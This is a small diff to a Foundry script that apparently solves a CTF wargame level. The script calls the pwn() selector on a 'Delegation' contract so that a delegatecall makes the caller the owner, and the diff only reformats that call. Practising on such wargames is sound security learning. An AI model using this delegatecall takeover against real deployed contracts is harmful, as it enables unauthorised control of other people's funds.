@@ -9,9 +9,7 @@ contract Level6Script is Script {
         Delegation target = Delegation(instanceAddress);
 
         vm.startBroadcast();
-        (bool success, ) = address(target).call(
-            abi.encodeWithSelector(Delegate.pwn.selector)
-        );
+        (bool success,) = address(target).call(abi.encodeWithSelector(Delegate.pwn.selector));
         require(success, "Delegate call failed");
         vm.stopBroadcast();
         address newOwner = target.owner();
